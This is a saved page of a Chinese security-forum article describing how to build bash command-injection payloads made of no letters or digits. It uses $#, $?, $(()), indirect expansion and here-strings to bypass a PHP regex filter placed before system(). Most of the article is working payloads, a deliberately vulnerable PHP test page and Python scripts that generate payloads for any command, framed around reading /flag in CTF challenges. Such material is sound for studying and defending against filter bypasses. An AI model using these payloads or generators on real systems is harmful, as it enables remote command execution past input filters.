<!DOCTYPE html>
<!-- saved from url=(0077)https://xz.aliyun.com/t/12242?time__1311=GqGxRDcG0%3DIxlrzG78GCDn76Kd7K%3DEox -->
<html lang="en" version="4"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <title>利用shell脚本变量构造无字母数字命令 - 先知社区</title>
    <meta name="description" content="先知社区，先知安全技术社区">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <link rel="icon" href="https://xz.aliyun.com/static/icon/favicon.ico" type="image/x-icon">
    <link href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/editormd.min.css">
    <link rel="stylesheet" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/tango.css">
    <link href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/bootstrap-responsive.min.css" rel="stylesheet">
    <!-- Le styles -->
    <link rel="stylesheet" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/OverlayStyle.css">
    <link rel="stylesheet" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/topic.css">
    <link rel="stylesheet" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/beautify.css">
    
    <link rel="stylesheet" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/editormd.css">
    <link rel="stylesheet" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/tango.css">
    <link rel="stylesheet" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/jquery.fancybox.min.css">

    <script src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/et_f.js.下载" id="AWSC_etModule"></script><script src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/jquery_221121.min.js.下载"></script><script src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/antidomxss_v702.js.下载"></script><script src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/interfaceacting230515.js.下载"></script><!--[if lte IE 8]>
        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
    <![endif]-->
    
    

    <!--[if !IE]> -->
    <script type="text/javascript" src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/jquery-2.1.3.min.js.下载"></script>
    
    
    <script src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/jquery.fancybox.min.js.下载"></script>

    <!-- <![endif]-->
<style type="text/css">#waf_nc_block{position:fixed;_position:absolute;width:100%;height:100%;top:0;bottom:0;left:0;z-index:99999}.waf-nc-mask{background:#000;opacity:.5;filter:alpha(opacity=50);width:100%;height:100%}.waf-nc-wrapper{width:348px;height:236px;text-align:center;position:absolute;top:50%;left:50%;margin-top:-160px;margin-left:-200px;margin-bottom:16px;background:#fff;box-shadow:0 0 10px 0 rgba(0,0,0,0.15)}.waf-nc-title{margin-top:28px;font-size:24px;font-weight:500;color:#181818;letter-spacing:1.71px;text-align:center}.waf-nc-description{margin-top:24px;margin-left:24px;font-size:14px;color:#666;text-align:left}.waf-nc-traceid-class{margin-top:8px;margin-left:24px;font-size:12px;color:#999;text-align:left}#nocaptcha{margin-left:24px;margin-top:14px}.nc_bg{background:#fff3ea!important}.btn_slide{background:#ff6a00!important;border:0!important;color:#fff!important;width:48px!important;height:48px!important;font-size:30px;font-weight:900!important;line-height:48px!important}.btn_ok{background:#ff6a00!important;border:0!important;color:#fff!important;width:48px!important;height:48px!important;font-size:30px;font-weight:900!important;line-height:48px!important}.nc_scale{background:rgba(241,241,242,1)!important;height:48px!important}.nc-lang-cnt{height:48px!important;margin-left:10px!important;line-height:48px!important;font-size:14px!important}</style><script src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/awsc.js.下载"></script></head>
<body class="">
<!-- navbar begin -->
<div class="navbar navbar-default">
    <div class="navbar-inner">
        <div class="container" style="text-align: center; position:relative;">
            <!--[if lte IE 8]>
            <span style="display:inline-block;margin:0 auto;color:red;">为了更好的体验，请使用IE10及以上版本</span>
            <![endif]-->
            <div class="brand-box">
                <a class="brand" href="https://xz.aliyun.com/tab/1"></a>
            </div>
            
                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F12242&amp;from_type=xianzhi" class="pull-right anonymous-user hh_loding">
                    登录</a>
            
            <div class="nav-collapse collapse">
                <div class="search d1 text-right">
                    <form method="get" action="https://xz.aliyun.com/search">
                        <input type="text" placeholder="搜索" name="keyword">
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
<!-- navbar end -->
<!-- main content begin -->
<div id="Wrapper" class="container">
    
    
    <div class="row2">
        <div class="span10">
            
    



    <script src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/jquery.toc.min.js.下载"></script>
    <script src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/toc.min.js.下载"></script>
    <script src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/dt.js.下载"></script>
    


<div class="row box content">
    
    <div class="box-container">
        <div class="main-topic">
            <div class="clearfix user-info topic-list">
                <p><span class="content-title ">利用shell脚本变量构造无字母数字命令</span>
                </p>
                <div class="topic-info">
                <span class="info-left">
                    <a href="https://xz.aliyun.com/u/55309">
                        <span class="username cell"> Fushuling</span></a> <span class="i-seprator"> / </span>
                    <span> 2023-03-01 10:50:00</span><span class="i-seprator"> / </span>
                    
                        <span>发表于重庆 / </span>
                    
                    <span>浏览数 8941</span>
                    
                    
                    <span class="content-node">
                    
                        <span class="label label-default label-node-first">
                            <a href="https://xz.aliyun.com/tab/4">社区板块</a></span>
                        <span class="label label-default">
                            <a href="https://xz.aliyun.com/node/16">WEB安全</a></span>
                    
                    </span>
                </span>
                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(12242);">
             顶(1)</a>
             <a class="vote vote-down" href="javascript:" onclick="voteDown(12242);">
             踩(0)</a></span>
                </div>
            </div>
            <hr>
            <div id="topic_content" class="topic-content markdown-body">
                <h2 id="toc-0">前言</h2>
<p>去年十二月份的时候我在先知上投稿了一篇<a href="https://xz.aliyun.com/t/11934" target="_blank">无字母数字命令执行黑魔法——shell脚本变量</a>，讲了讲Linux下某些环境变量在某些特定情况下可以发挥的作用，但当时我写的时候其实并没有太过于把这个技巧放在心里，因为我当时觉得这种技巧也只可能在CTF题目作为一个有趣的考点进行考察，很难在实际渗透中发挥作用。</p>
<p>直到今年做ctfshow的极限命令执行的时候，学会了利用数字构造字母进行命令执行的方法，再到后来水群的时候有个师傅遇到了个问题，就是自己已经可以命令执行了，但输入的命令全都变成了小写，而某个想要执行的命令必须得大写，那时我就想到既然我都可以无字母数字rce了，解决大小写问题不是轻而易举？然后我才猛然发现其实shell脚本变量在真实的渗透中其实也是可以发挥作用的，在这里分享一下最近我学到的知识和思考。</p>
<h2 id="toc-1">shell脚本中$的多种用法</h2>
<p>和之前一样，首先介绍一下shell脚本中$的多种用法(<a href="https://blog.csdn.net/ly_qiu/article/details/105765772" target="_blank">参考</a>)：</p>
<table>
<thead><tr>
<th>变量名</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>$0</td>
<td>脚本本身的名字</td>
</tr>
<tr>
<td>$1</td>
<td>脚本后所输入的第一串字符</td>
</tr>
<tr>
<td>$2</td>
<td>传递给该shell脚本的第二个参数</td>
</tr>
<tr>
<td>$*</td>
<td>脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’</td>
</tr>
<tr>
<td>$@</td>
<td>脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’</td>
</tr>
<tr>
<td>$_</td>
<td>表示上一个命令的最后一个参数</td>
</tr>
<tr>
<td>$#</td>
<td>#脚本后所输入的字符串个数</td>
</tr>
<tr>
<td>$$</td>
<td>脚本运行的当前进程ID号</td>
</tr>
<tr>
<td>$!</td>
<td>表示最后执行的后台命令的PID</td>
</tr>
<tr>
<td>$?</td>
<td>显示最后命令的退出状态，0表示没有错误，其他表示由错误</td>
</tr>
</tbody>
</table>
<h2 id="toc-2">Web-Bash-Vino0o0o的构造思路</h2>
<p>这种题最早的出处应该是2017年34c3CTF里的<a href="https://hack.more.systems/writeup/2017/12/30/34c3ctf-minbashmaxfun/" target="_blank">minbashmaxfun</a>，然后2020年安洵杯里有一道<a href="https://xz.aliyun.com/t/8581#toc-3" target="_blank">Web-Bash-Vino0o0o</a>，借用了这种思路，不过因为原出处里 <code>bash&lt;&lt;&lt;{,,,,}</code>这种形式并不能完美的执行命令，所以出题人采用了利用八进制实现命令构造的方法，美中不足的是那种做法并不能做到不出现数字，payload里出现了数字0，但那种构造思想很有趣，我也是顺着那条思路继续构造的，我使用的环境是centos，因此某些payload其他linux上可能不适用。</p>
<p>首先，在linux里完美可以利用八进制的方法绕过一些ban了字母的题 ，即我们可以使用<code>$'\xxx'</code>的方式执行命令，比如我们可以用<code>$'\154\163'</code>执行ls：<br>
<a id="img0" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103457-a869784a-b7d9-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103457-a869784a-b7d9-1.jpg"></a><br>
可以发现有了这种技巧我们就可以在数字可用的情况下进行命令构造。</p>
<p>除此之外在bash里我们可以使用<code>[base#]n</code>的方式表示数字，也就是说我可以用<code>2#100</code>表示十进制数字4：<br>
<a id="img1" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103529-bb654a14-b7d9-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103529-bb654a14-b7d9-1.jpg"></a></p>
<p>因此从这里我们又向前推进了一步，只有我们有数字1或者0那就可以继续构造命令。假如现在字母或者数字只有1和0可以用，这时我们可以使用位移运算1&lt;&lt;1代替2，得到payload：</p>

<pre><code>$\'\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10100011))\'</code></pre>
<p>理论上它可以代替<code>$'\154\163'</code>执行命令，但事实上是不行的：<br>
<a id="img2" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103548-c64f4b14-b7d9-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103548-c64f4b14-b7d9-1.jpg"></a><br>
可以看到这里只解析了一层解析到<code>$'\154\163'</code>就解析不下去了，想要它继续解析，我们不难想到Linux里的eval函数：<br>
<a id="img3" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103559-cd403d84-b7d9-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103559-cd403d84-b7d9-1.jpg"></a><br>
但可惜我们是不能使用它的，所以还是得老老实实的用1或者0构造，这里我们可以想到bash里的一种语法：command [args] &lt;&lt;&lt;["]$word["]，在这种语法下$word会展开并作为command的stdin，以此来继续执行命令：<br>
<a id="img4" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103611-d4461eb4-b7d9-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103611-d4461eb4-b7d9-1.jpg"></a><br>
但现在有个问题，就是用什么来代替bash，这时可以想到我之前文章里提到过的一个环境变量$0，它可以表示脚本本身的名字，而这里正是bash：<br>
<a id="img5" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103621-da4ead62-b7d9-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103621-da4ead62-b7d9-1.jpg"></a><br>
因此我们不难想出一种构造方式来：</p>

<pre><code>$0&lt;&lt;&lt;$\'\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10100011))\'</code></pre>
<p><a id="img6" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103631-e02c4730-b7d9-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103631-e02c4730-b7d9-1.jpg"></a><br>
成功执行！假如这是一道CTF题，我们就该想想怎么执行cat /flag了，你想到的payload可能是：</p>

<pre><code>$0&lt;&lt;&lt;$\'\\$(($((1&lt;&lt;1))#10001111))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10100100))\\$(($((1&lt;&lt;1))#101000))\\$(($((1&lt;&lt;1))#111001))\\$(($((1&lt;&lt;1))#10010010))\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10010011))\'</code></pre>
<p>遗憾的是，这种payload并不能执行成功：<br>
<a id="img7" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103642-e6adb95e-b7d9-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103642-e6adb95e-b7d9-1.jpg"></a><br>
bash会告诉你不存在<code>cat /flag</code>这种文件或者目录，很明显，bash是把它当作一个整体了，并没有有效的以空格作为分割，让cat作为命令，/flag作为参数，在ctfshow的极限命令执行题目里g4师傅给出了一种解决这种问题的方法——通过两次here-strings的方法来解析复杂的带参数命令，也就是说我们可以把payload改成：</p>

<pre><code>$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\'\\$(($((1&lt;&lt;1))#10001111))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10100100))\\$(($((1&lt;&lt;1))#101000))\\$(($((1&lt;&lt;1))#111001))\\$(($((1&lt;&lt;1))#10010010))\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10010011))\'</code></pre>
<p><a id="img8" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103650-eb6716ac-b7d9-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103650-eb6716ac-b7d9-1.jpg"></a><br>
执行成功，我们拿到了flag，但可以看到这种构造方式不够极限，里面不但出现0更出现了1，下面，我们开始构造真正的无字母数字命令。</p>
<h2 id="toc-3">利用$#构造</h2>
<p>在之前那篇文章里我也提到过<code>$#</code>这个变量，它可以表示#脚本后所输入的字符串个数：<br>
<a id="img9" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301104203-a618deea-b7da-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301104203-a618deea-b7da-1.jpg"></a><br>
如果#后面啥也没有它就是0，有一个字符串比如#就变成了1，似乎现在我们只要把1用${##}替换，0用${#}替换即可：</p>

<pre><code>$${#}&lt;&lt;&lt;$${#}\&lt;\&lt;\&lt;\$\'\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${#}${##}${##}${##}${##}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${#}${##}${##}${#}${##}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${##}${#}${#}${##}${#}${#}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${##}${#}${#}${#}))\\$(($((${##}&lt;&lt;${##}))#${##}${##}${##}${#}${#}${##}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${##}${#}${#}${##}${#}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${##}${##}${#}${##}${#}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${#}${##}${##}${#}${##}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${##}${#}${#}${##}${##}))\'</code></pre>
<p><a id="img10" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103717-fb613fd8-b7d9-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103717-fb613fd8-b7d9-1.jpg"></a></p>
<p>可惜这种执行方法是不行的，因为虽然$0表示bash，${#}表示0，但把它们拼起来并不表示bash，这里$$直接执行了，意思是脚本运行的当前进程ID号。下一步你可能会想到linux里的字符串拼接，但这种拼接也只会解析第一层，不会解析到最后：</p>
<p><a id="img11" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103727-014d833e-b7da-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103727-014d833e-b7da-1.jpg"></a></p>
<p>这时我们可以想到linux下感叹号!的一种用法，它可以进行变量替换：</p>
<p><a id="img12" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103737-07352bd0-b7da-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103737-07352bd0-b7da-1.jpg"></a></p>
<p>因此理论上我们只要找到一个值为零的变量，然后就可以用这种方法进行变量替换得到$0，并且还能成功解析，这时我们很容易想到刚刚使用的${#}，毕竟它的值就是零嘛：</p>
<p><a id="img13" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103745-0c0b62b4-b7da-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103745-0c0b62b4-b7da-1.jpg"></a></p>
<p>可以看到确实能得到bash，我们再次替换回去，可以得到新payload：</p>

<pre><code>${!#}&lt;&lt;&lt;${!#}\&lt;\&lt;\&lt;\$\'\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${#}${##}${##}${##}${##}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${#}${##}${##}${#}${##}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${##}${#}${#}${##}${#}${#}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${##}${#}${#}${#}))\\$(($((${##}&lt;&lt;${##}))#${##}${##}${##}${#}${#}${##}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${##}${#}${#}${##}${#}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${##}${##}${#}${##}${#}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${#}${##}${##}${#}${##}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${##}${#}${#}${##}${##}))\'</code></pre>
<p><a id="img14" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103753-1122e880-b7da-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103753-1122e880-b7da-1.jpg"></a></p>
<p>执行成功！但就这样还没完，毕竟这个payload理论上只是本地可以使用，像那道题原本的php环境里究竟能不能成功执行还是个未知数，我们起个本地环境：</p>

<pre><code>&lt;?php
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    if(preg_match("/[A-Za-z0-9]+/",$cmd)){
        die("NO.");
    }
    system($cmd);
}else{
    highlight_file(__FILE__);
}</code></pre>
<p>把payload传过去试试：</p>
<p><a id="img15" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103803-16e704ae-b7da-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103803-16e704ae-b7da-1.jpg"></a></p>
<p>可惜，这种方法在php里是不成功的。但这种payload并不是完全不行，经过我的研究，payload其实只是${!#}&lt;&lt;&lt;${!#}这一段没解析出来bash&lt;&lt;&lt;bash，所以导致命令失效，可以看到我们把它替换成$0&lt;&lt;&lt;$0其实php也行：</p>
<p><a id="img16" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103811-1bf0719c-b7da-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103811-1bf0719c-b7da-1.jpg"></a></p>
<p>这里面的具体原因我也不是很懂，自我感觉可能是${!#}这种复杂变量不能通过php的system函数解析出来，于是我把它换了一种形式：</p>
<p><a id="img17" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103819-20c005d4-b7da-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103819-20c005d4-b7da-1.jpg"></a></p>
<p>其实本质上也没啥差别，我只是增加了变量$__作为过渡，减少了解析的过程，但惊喜的是这种方法即使是在php下也可以成功解析：</p>

<pre><code>__=${#};${!__}&lt;&lt;&lt;${!__}\&lt;\&lt;\&lt;\$\'\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${#}${##}${##}${##}${##}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${#}${##}${##}${#}${##}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${##}${#}${#}${##}${#}${#}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${##}${#}${#}${#}))\\$(($((${##}&lt;&lt;${##}))#${##}${##}${##}${#}${#}${##}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${##}${#}${#}${##}${#}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${##}${##}${#}${##}${#}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${#}${##}${##}${#}${##}))\\$(($((${##}&lt;&lt;${##}))#${##}${#}${#}${##}${#}${#}${##}${##}))\'</code></pre>
<p><a id="img18" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103827-25813124-b7da-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103827-25813124-b7da-1.jpg"></a></p>
<p>利用脚本：</p>

<pre><code>cmd='cat /flag'

payload='__=${#};${!__}&lt;&lt;&lt;${!__}\\&lt;\\&lt;\\&lt;\\$\\\''
for c in cmd:
        payload+=f'\\\\$(($((1&lt;&lt;1))#{bin(int(oct(ord(c))[2:]))[2:]}))'.replace('1','${##}').replace('0','${#}')

payload+='\\\''

print(payload)</code></pre>
<p>顺着这种思路，我开始思考其他构造方式。</p>
<h2 id="toc-4">利用$?构造</h2>
<p>从上一次构造我们其实可以发现，只要我们找到一个代表值为零的变量就可以得到bash进而继续构造，$?这个变量自然而然进入我的视线，它可以显示最后命令的退出状态，0表示没有错误，其他表示有错误 ，因此只要我们的payload最后不报错它的值自然还是0了：</p>
<p><a id="img19" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103841-2d637dc0-b7da-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103841-2d637dc0-b7da-1.jpg"></a></p>
<p>看我们上面的payload可以发现其实需要的数字也就0、1和2，2可以由1&lt;&lt;1构造出来，可以省略。不过由于$?并不像$#一样灵活，可以随意构造出来任何数字，所以我为了减轻麻烦使用自增运算构造出了1，2这两个数字，现在就已经足够了，payload：</p>

<pre><code>__=${?}&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=${?}&amp;&amp;${!_____}&lt;&lt;&lt;${!_____}\&lt;\&lt;\&lt;\$\'\\$((${____}#${__}${_____}${_____}${_____}${__}${__}${__}${__}))\\$((${____}#${__}${_____}${_____}${_____}${__}${__}${_____}${__}))\\$((${____}#${__}${_____}${__}${_____}${_____}${__}${_____}${_____}))\\$((${____}#${__}${_____}${__}${_____}${_____}${_____}))\\$((${____}#${__}${__}${__}${_____}${_____}${__}))\\$((${____}#${__}${_____}${_____}${__}${_____}${_____}${__}${_____}))\\$((${____}#${__}${_____}${_____}${__}${__}${_____}${__}${_____}))\\$((${____}#${__}${_____}${_____}${_____}${__}${__}${_____}${__}))\\$((${____}#${__}${_____}${_____}${__}${_____}${_____}${__}${__}))\'</code></pre>
<p><a id="img20" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103850-3324950a-b7da-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103850-3324950a-b7da-1.jpg"></a></p>
<p>直接像之前一样POST我们的payload的话报文里payload并没有被当作一个整体解析，所以我们可以url编码一下：</p>
<p><a id="img21" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103904-3b1bb0fe-b7da-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103904-3b1bb0fe-b7da-1.jpg"></a></p>
<p>成功执行。</p>
<p>利用脚本：</p>

<pre><code>cmd='cat /flag'

payload='__=${?}&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=${?}&amp;&amp;${!_____}&lt;&lt;&lt;${!_____}\\&lt;\\&lt;\\&lt;\\$\\\''
for c in cmd:
        payload+=f'\\\\$((2#{bin(int(oct(ord(c))[2:]))[2:]}))'.replace('1','${__}').replace('2','${____}').replace('0','${_____}')

payload+='\\\''

print(payload)</code></pre>
<h2 id="toc-5">利用$(())构造</h2>
<p>利用$(())构造是g4师傅出的极限命令执行最后的预期解，不过g4师傅使用的是按位取反的方法构造出了payload，我这里给出一种不用取反的payload。</p>
<p>linux里可以通过<code>__=$(())</code>的方式将变量的值设置为0：</p>
<p><a id="img22" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103919-4443759a-b7da-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103919-4443759a-b7da-1.jpg"></a></p>
<p>有了0我们自然可以像利用$?进行构造的方式一样通过自增继续构造：</p>

<pre><code>__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;${!_____}&lt;&lt;&lt;${!_____}\&lt;\&lt;\&lt;\$\'\\$((${____}#${__}${_____}${_____}${_____}${__}${__}${__}${__}))\\$((${____}#${__}${_____}${_____}${_____}${__}${__}${_____}${__}))\\$((${____}#${__}${_____}${__}${_____}${_____}${__}${_____}${_____}))\\$((${____}#${__}${_____}${__}${_____}${_____}${_____}))\\$((${____}#${__}${__}${__}${_____}${_____}${__}))\\$((${____}#${__}${_____}${_____}${__}${_____}${_____}${__}${_____}))\\$((${____}#${__}${_____}${_____}${__}${__}${_____}${__}${_____}))\\$((${____}#${__}${_____}${_____}${_____}${__}${__}${_____}${__}))\\$((${____}#${__}${_____}${_____}${__}${_____}${_____}${__}${__}))\'</code></pre>
<p><a id="img23" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103928-49cd22f4-b7da-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103928-49cd22f4-b7da-1.jpg"></a><br>
同样的，POST的话记得编码一下：<br>
<a id="img24" href="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103938-4f7a1d1a-b7da-1.jpg"><img src="./利用shell脚本变量构造无字母数字命令 - 先知社区_files/20230301103938-4f7a1d1a-b7da-1.jpg"></a></p>
<p>可以看到我们的payload其实也就替换了两个xx=$(())，所以如果大家还找到什么值为零的变量的话替换这两个即可。</p>
<p>利用脚本：</p>

<pre><code>cmd='cat /flag'

payload='__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;${!_____}&lt;&lt;&lt;${!_____}\\&lt;\\&lt;\\&lt;\\$\\\''
for c in cmd:
        payload+=f'\\\\$((2#{bin(int(oct(ord(c))[2:]))[2:]}))'.replace('1','${__}').replace('2','${____}').replace('0','${_____}')

payload+='\\\''

print(payload)</code></pre>
<h2 id="toc-6">后记</h2>
<p>本质上还是参考了一些优秀师傅的思路，不过最后走出了一条属于自己的路还是挺开心的，各位大佬轻喷。</p>
<h2 id="toc-7">参考</h2>
<p><a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc" target="_blank">CTFshow-周末大挑战官方wp</a></p>
<p><a href="https://xz.aliyun.com/t/8581#toc-3" target="_blank">Web-Bash-Vino0o0o</a></p>

            </div>
            

            <div class="post-user-action" style="margin-top: 34px;">
                <span class="btn btn-default pull-right" id="mark" data-action="topic" data-pk="12242">
                    <span id="mark-text">点击收藏 </span><span class="i-seprator"> | </span><span id="mark-count">1</span>
                </span>
                
                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="12242">
                     <span>关注</span><span class="i-seprator"> | </span><span id="follow-count">1</span>
                    </span>
                
                
                    <span class="btn btn-default pull-right">
                     <span>
                         
                             <span id="ready_reward" data-toggle="modal" data-target="#myModal">打赏</span>
                         
                     </span>
                    </span>
                
                <div class="clearfix"></div>
            </div>
            
                <div class="related-section">
                    <div class="related-box">
                        
                            <span><a class="pull-left" href="https://xz.aliyun.com/t/12241" title="AD学习记录（中）"><span class="related-label" style="padding: 3px 4px;margin-right: 3px;">上一篇：</span>AD学习记录（中）</a></span>
                        
                        
                            <span><a class="pull-left" href="https://xz.aliyun.com/t/12247" title="记某红队钓鱼样本浅分析"><span class="related-label" style="">下一篇：</span>记某红队钓鱼样本浅分析</a></span>
                        
                    </div>
                </div>
            
        </div>
    </div>
</div>
<div class="modal fade" id="myModal" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title" id="myModalLabel" style="text-align: center">
                    积分打赏
                </h4>
            </div>
            <div class="modal-body" id="button-value">
                <div style="text-align: center;">
                 <div role="group">
                    <button type="button" class="btn btn-secondary m64" style="min-width: 64px;" data-value="type1">
                        1分
                    </button>
                    <button type="button" class="btn btn-secondary m64" style="min-width: 64px;" data-value="type2">
                        2分
                    </button>
                    <button type="button" class="btn btn-secondary m64" style="min-width: 64px;" data-value="type3">
                        5分
                    </button>
                 </div>
                 <br>
                 <div style="margin-top: 20px">
                    <button type="button" class="btn btn-secondary m64" style="min-width: 64px;" data-value="type4">
                        8分
                    </button>
                    <button type="button" class="btn btn-secondary m64" style="min-width: 64px;" data-value="type5">
                        10分
                    </button>
                    <button type="button" class="btn btn-secondary m64" style="min-width: 64px;" data-value="type6">
                        20分
                    </button>
                 </div>
                </div>
            </div>
            <div class="modal-footer" id="confirm">
                <button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>
                <button type="button" class="btn btn-primary" id="reward_topic" data-pk="12242">确定</button>
            </div>
        </div>
    </div><!-- /.modal -->
</div>

    <!-- topic & appendix -->
    



<div class="row box">
    <ol class="breadcrumb">
        <li class="active">0 条回复</li>
    </ol>
    <div class="box-container post-container">
        
            <ul>
